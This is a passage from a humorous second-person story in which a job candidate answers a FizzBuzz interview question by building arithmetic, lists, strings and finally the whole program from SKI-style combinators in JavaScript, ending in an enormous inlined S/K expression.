let E = B(B1); // x =&amp;gt; y =&amp;gt; z =&amp;gt; w =&amp;gt; v =&amp;gt; x(y)(z(w(v)))
let C_STAR = B(C); // x =&amp;gt; y =&amp;gt; z =&amp;gt; w =&amp;gt; x(y)(w)(z)
let C_STAR_STAR = B(C_STAR); // x =&amp;gt; y =&amp;gt; z =&amp;gt; w =&amp;gt; v =&amp;gt; x(y)(z)(v)(w)&lt;/code&gt;
    &lt;p&gt;Dana breaks away from the screen. “Typically I see a &lt;code&gt;for&lt;/code&gt; loop
by now. Are you sure we’re talking about the same problem?”&lt;/p&gt;
    &lt;p&gt;“Trust me.”&lt;/p&gt;
    &lt;code&gt;let TRUE = K;
let FALSE = K(I);
let NOT = V(FALSE)(TRUE);&lt;/code&gt;
    &lt;p&gt;She stands. “Okay,” she says finally. “Let me stop you there.”&lt;/p&gt;
    &lt;p&gt;“Something wrong?”&lt;/p&gt;
    &lt;p&gt;“You’re not the first candidate to show up here and reinvent programming from first principles using lambda calculus.”&lt;/p&gt;
    &lt;p&gt;You stare, blankly. “Lambda calculus?”&lt;/p&gt;
    &lt;p&gt;“Look,” she says. “We’ve all read Programming with Nothing. We’ve all seen What is PLUS times PLUS. You’re not breaking any new ground here.”&lt;/p&gt;
    &lt;p&gt;You shake your head vigorously. “I would never be caught dead using Lambda calculus. It’s a bloated language.”&lt;/p&gt;
    &lt;p&gt;Dana’s turn to stare. You move on to numbers.&lt;/p&gt;
    &lt;code&gt;let ZERO = I;
let IS_ZERO = T(TRUE);
let SUCC = V(FALSE); // successor
let PRED = T(FALSE); // predecessor
let DECREMENT = S(W(IS_ZERO))(PRED); // clamped predecessor

let ONE = SUCC(ZERO);
let TWO = SUCC(ONE);
let THREE = SUCC(TWO);
let FOUR = SUCC(THREE);
let FIVE = SUCC(FOUR);
let SIX = SUCC(FIVE);
let SEVEN = SUCC(SIX);
let EIGHT = SUCC(SEVEN);
let NINE = SUCC(EIGHT);
let TEN = SUCC(NINE);&lt;/code&gt;
    &lt;p&gt;Dana leans forward. She seems interested now. “Church numerals?”&lt;/p&gt;
    &lt;p&gt;“Barendregt. Church is too mainstream.”&lt;/p&gt;
    &lt;p&gt;You start with a lambda calculus expression.&lt;/p&gt;
    &lt;code&gt;let ADD = (m) =&amp;gt; (n) =&amp;gt; IS_ZERO(m)(n)(SUCC(ADD(PRED(m))(n)));&lt;/code&gt;
    &lt;p&gt;“Dirty,” you mutter. “But it’s a start.”&lt;/p&gt;
    &lt;p&gt;You scribble in your notepad briefly. Showing all your work would be tedious, but you should at least walk her through the interesting parts.&lt;/p&gt;
    &lt;p&gt;“First, we add combinators until &lt;code&gt;n&lt;/code&gt; is by itself on the right.”&lt;/p&gt;
    &lt;code&gt;let ADD = (m) =&amp;gt; (n) =&amp;gt;
  S(C(B(B(B))(IS_ZERO)(m))(SUCC))(ADD(PRED(m)))(n);&lt;/code&gt;
    &lt;p&gt;“Ah,” she says. “Now we can remove &lt;code&gt;n&lt;/code&gt;.”&lt;/p&gt;
    &lt;p&gt;She’s warming up.&lt;/p&gt;
    &lt;code&gt;let ADD = (m) =&amp;gt; S(C(B(B(B))(IS_ZERO)(m))(SUCC))(ADD(PRED(m)));&lt;/code&gt;
    &lt;p&gt;You do it again for &lt;code&gt;m&lt;/code&gt;&lt;/p&gt;
    &lt;code&gt;// let ADD = (m) =&amp;gt;
//   S(B(S)(C_STAR_STAR(B)(C)(B(B(B))(IS_ZERO))(SUCC)))(
//     B(ADD)(PRED),
//   )(m);

let ADD = S(B(S)(C_STAR_STAR(B)(C)(B(B(B))(IS_ZERO))(SUCC)))(
  B(ADD)(PRED),
);&lt;/code&gt;
    &lt;p&gt;Point-free. Clean. But not clean enough.&lt;/p&gt;
    &lt;p&gt;“Now for that pesky self reference…”&lt;/p&gt;
    &lt;code&gt;let ADD_MAKER = (self) =&amp;gt;
  S(B(S)(C_STAR_STAR(B)(C)(B(B(B))(IS_ZERO))(SUCC)))(
    B(self)(PRED),
  );

let Y = W(C)(S(B)(C(W(C)))); // x =&amp;gt; (y =&amp;gt; x(y(y)))(y =&amp;gt; x(y(y)))&lt;/code&gt;
    &lt;p&gt;“Is that the… Y combinator?” Dana asks.&lt;/p&gt;
    &lt;p&gt;“Can’t recurse without it.”&lt;/p&gt;
    &lt;p&gt;“It’s JavaScript. You can literally do recursion without it.”&lt;/p&gt;
    &lt;p&gt;“It won’t be JavaScript for much longer.”&lt;/p&gt;
    &lt;code&gt;let ADD = Y(ADD_MAKER);

console.log(ADD(ONE)(TWO));&lt;/code&gt;
    &lt;p&gt;You run the program for the first time.&lt;/p&gt;
    &lt;code&gt;Uncaught RangeError: Maximum call stack size exceeded&lt;/code&gt;
    &lt;p&gt;Dana smirks. “Well, yeah. JavaScript is an eager language. Can’t use the Y combinator.”&lt;/p&gt;
    &lt;p&gt;You saw this coming. You paste your code into Skoobert.&lt;/p&gt;
    &lt;p&gt;“Skoobert?” Dana asks.&lt;/p&gt;
    &lt;p&gt;“JavaScript but lazy,” you explain. “And without the bloat.”&lt;/p&gt;
    &lt;p&gt;You run it again.&lt;/p&gt;
    &lt;code&gt;[Function]&lt;/code&gt;
    &lt;p&gt;You sigh. Perfect code tarnished by human consumption.&lt;/p&gt;
    &lt;code&gt;let extractNumber = Y(
  B(S(C(IS_ZERO)(0)))(B(B((x) =&amp;gt; x + 1))(C(B)(PRED))),
);

console.log(extractNumber(ADD(ONE)(TWO)));&lt;/code&gt;
    &lt;code&gt;3&lt;/code&gt;
    &lt;p&gt;Back on track. You type faster.&lt;/p&gt;
    &lt;code&gt;let SUBTRACT = C(
  Y(
    B(S(B(S)(C_STAR_STAR(B)(C)(B(B(B))(IS_ZERO))(DECREMENT))))(
      C(S(K(I))(B))(PRED),
    ),
  ),
);

let MULTIPLY = Y(
  B(C)(
    B(S(B(B)(C(IS_ZERO)(ZERO))))(
      B(B(S(ADD)))(C(B(B)(C))(PRED)),
    ),
  ),
);

let LESS_THAN_OR_EQUAL = B1(IS_ZERO)(SUBTRACT);
let GREATER_THAN_OR_EQUAL = C(LESS_THAN_OR_EQUAL);
let GREATER_THAN = B1(NOT)(LESS_THAN_OR_EQUAL);
let LESS_THAN = B1(NOT)(GREATER_THAN_OR_EQUAL);

let RECURSE_SUB = B(B(W))(C(B(B)(B))(SUBTRACT));

let MOD = Y(B(S(B(S)(W(C_STAR(LESS_THAN)))))(RECURSE_SUB));

let DIVIDE = Y(
  B(B(S(C(IS_ZERO)(ZERO))))(
    B(S(B(S)(C(B(C)(LESS_THAN))(ZERO))))(
      B(B(B(SUCC)))(RECURSE_SUB),
    ),
  ),
);&lt;/code&gt;
    &lt;p&gt;Numbers are done. Lists:&lt;/p&gt;
    &lt;code&gt;let CONS = V;
let FIRST = T(TRUE);
let REST = T(FALSE);
let EMPTY = K(TRUE);
let END = EMPTY;
let IS_EMPTY = T(K(K(FALSE)));

let NTH = Y(
  B(S(B(S)(B(C(IS_ZERO))(FIRST))))(
    C(B(C)(B(B(B))(C(B)(REST))))(PRED),
  ),
);

let CONCAT = B(T(CONS))(FOLD);

let RANGE = Y(
  C(
    B(C)(
      B(B(C))(
        B(S(B(S)(LESS_THAN_OR_EQUAL)))(
          B(S(B(B)(CONS)))(C(B)(SUCC)),
        ),
      ),
    ),
  )(EMPTY),
);

let FOLD = Y(
  B(S(B(B)(B(S)(IS_EMPTY))))(
    B(S(B(S)(C(B(B(B))(C(B)(FIRST))))))(C(B)(REST)),
  ),
);

let MAP = C(B(C)(C(B(B)(FOLD))(B(CONS))))(EMPTY);&lt;/code&gt;
    &lt;p&gt;More pretty-printing:&lt;/p&gt;
    &lt;code&gt;let renderList = (fmt) =&amp;gt; (sep) =&amp;gt; (xs) =&amp;gt;
  IS_EMPTY(xs)("")(
    fmt(FIRST(xs)) +
      IS_EMPTY(REST(xs))("")(
        sep + renderList(fmt)(sep)(REST(xs)),
      ),
  );

let showLines = (fmt) =&amp;gt; (list) =&amp;gt; renderList(fmt)("\n")(list);&lt;/code&gt;
    &lt;p&gt;“I won’t bother making the formatters point-free, since they’re just output,” you say, as if Dana cares.&lt;/p&gt;
    &lt;p&gt;Sanity check:&lt;/p&gt;
    &lt;code&gt;console.log(
  showLines(extractNumber)(MAP(RANGE(ONE)(THREE))(SUCC)),
);&lt;/code&gt;
    &lt;code&gt;2
3
4&lt;/code&gt;
    &lt;p&gt;Dana has given up following along.&lt;/p&gt;
    &lt;code&gt;let DECIMAL2 = B(ADD)(MULTIPLY(TEN)); // base 10

let CHAR_A = ONE;
let CHAR_B = TWO;
let CHAR_C = THREE;
let CHAR_D = FOUR;
let CHAR_E = FIVE;
let CHAR_F = SIX;
let CHAR_G = SEVEN;
let CHAR_H = EIGHT;
let CHAR_I = NINE;
let CHAR_J = TEN;
let CHAR_K = DECIMAL2(ONE)(ONE);
let CHAR_L = DECIMAL2(ONE)(TWO);
let CHAR_M = DECIMAL2(ONE)(THREE);
let CHAR_N = DECIMAL2(ONE)(FOUR);
let CHAR_O = DECIMAL2(ONE)(FIVE);
let CHAR_P = DECIMAL2(ONE)(SIX);
let CHAR_Q = DECIMAL2(ONE)(SEVEN);
let CHAR_R = DECIMAL2(ONE)(EIGHT);
let CHAR_S = DECIMAL2(ONE)(NINE);
let CHAR_T = DECIMAL2(TWO)(ZERO);
let CHAR_U = DECIMAL2(TWO)(ONE);
let CHAR_V = DECIMAL2(TWO)(TWO);
let CHAR_W = DECIMAL2(TWO)(THREE);
let CHAR_X = DECIMAL2(TWO)(FOUR);
let CHAR_Y = DECIMAL2(TWO)(FIVE);
let CHAR_Z = DECIMAL2(TWO)(SIX);
let CHAR_0 = DECIMAL2(TWO)(SEVEN);
let CHAR_1 = DECIMAL2(TWO)(EIGHT);
let CHAR_2 = DECIMAL2(TWO)(NINE);
let CHAR_3 = DECIMAL2(THREE)(ZERO);
let CHAR_4 = DECIMAL2(THREE)(ONE);
let CHAR_5 = DECIMAL2(THREE)(TWO);
let CHAR_6 = DECIMAL2(THREE)(THREE);
let CHAR_7 = DECIMAL2(THREE)(FOUR);
let CHAR_8 = DECIMAL2(THREE)(FIVE);
let CHAR_9 = DECIMAL2(THREE)(SIX);

let ARRAY = Y(
  B(S(B(S)(C(B(C(IS_EMPTY)))(END))))(
    C(B(B)(B))(C(B(B)(B))(CONS)),
  ),
)(I);

let FIZZ = ARRAY(CHAR_F)(CHAR_I)(CHAR_Z)(CHAR_Z)(END);
let BUZZ = ARRAY(CHAR_B)(CHAR_U)(CHAR_Z)(CHAR_Z)(END);
let FIZZBUZZ = CONCAT(FIZZ)(BUZZ);&lt;/code&gt;
    &lt;p&gt;Printing strings:&lt;/p&gt;
    &lt;code&gt;let extractString = (lst) =&amp;gt;
  IS_EMPTY(lst)("")(
    NTH(letters)(PRED(FIRST(lst))) + extractString(REST(lst)),
  );

console.log(extractString(FIZZBUZZ));&lt;/code&gt;
    &lt;code&gt;fizzbuzz&lt;/code&gt;
    &lt;p&gt;Just a few more loose ends. Numbers to digits. Digits to strings. Strings to output.&lt;/p&gt;
    &lt;code&gt;let array = Y(
  (h) =&amp;gt; (acc) =&amp;gt; (x) =&amp;gt;
    x === END ? acc(END) : h((t) =&amp;gt; acc(CONS(x)(t))),
)(I);

let letters =
  array("a")("b")("c")("d")("e")("f")("g")("h")("i")("j")
  ("k")("l")("m")("n")("o")("p")("q")("r")("s")("t")("u")
  ("v")("w")("x")("y")("z")
  ("0")("1")("2")("3")("4")("5")("6")("7")("8")("9")(END);

let DIGITS_NUMERAL =
  ARRAY(CHAR_0)(CHAR_1)(CHAR_2)(CHAR_3)(CHAR_4)
  (CHAR_5)(CHAR_6)(CHAR_7)(CHAR_8)(CHAR_9)(END);

let NUMBER_TO_DIGIT_LIST = Y(
  C(
    B(S)(
      C(B(B)(B(S(B(S)(IS_ZERO)))(B(CONCAT))))(C(DIVIDE)(TEN)),
    ),
  )(C(B(CONS)(C(MOD)(TEN)))(EMPTY)),
);

let NUMBER_TO_STRING = S(
  C(B(FOLD)(NUMBER_TO_DIGIT_LIST))(
    B(CONS)(NTH(DIGITS_NUMERAL)),
  ),
)(B(T(EMPTY))(K(I)));&lt;/code&gt;
    &lt;p&gt;You take a deep breath and look Dana in the eye.&lt;/p&gt;
    &lt;p&gt;“And now… the main event.”&lt;/p&gt;
    &lt;code&gt;let FIFTEEN = DECIMAL2(ONE)(FIVE);
let ONE_HUNDRED = MULTIPLY(TEN)(TEN);

let FIZZBUZZ_RESULT = MAP(RANGE(ONE)(ONE_HUNDRED))(
  S(
    B(S(C(R(FIZZBUZZ))(FIFTEEN)))(
      B(S(C(R(FIZZ))(THREE)))(
        B(C(C(R(BUZZ))(FIVE)))(NUMBER_TO_STRING),
      ),
    ),
  )(B(B(IS_ZERO))(MOD)),
);

console.log(showLines(extractString)(FIZZBUZZ_RESULT));&lt;/code&gt;
    &lt;p&gt;“Are you satisfied?” she cries. But you aren’t. Not yet.&lt;/p&gt;
    &lt;p&gt;Variables are for wimps. You replace each with its definition.&lt;/p&gt;
    &lt;code&gt;let FIZZBUZZ_RESULT = ((((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K))))))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))((((S)((K)(S)))(K))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))))))((K)(K)))((((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((S)((((S)(S))((K)(((S)(K))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))))((K)(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))((((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))))))))(((S)(((((S)((K)(S)))(K))((S)(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))(((((((S)((K)(S)))(K))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K))))))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))((((((((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)((K)(S)))(K))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)